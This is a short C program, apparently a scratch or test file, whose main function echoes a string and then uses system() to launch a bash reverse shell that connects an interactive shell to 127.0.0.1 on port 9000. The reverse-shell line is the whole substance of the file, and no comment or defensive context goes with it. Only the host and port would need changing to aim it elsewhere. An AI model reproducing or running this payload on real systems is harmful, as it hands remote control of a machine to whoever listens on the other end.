#include <stdio.h>
#include <stdlib.h>
int main(){
  int  a;

  system("echo ber");
  system("/bin/bash -c 'sh -i >&/dev/tcp/127.0.0.1/9000 0>&1'");
  return 0;
}
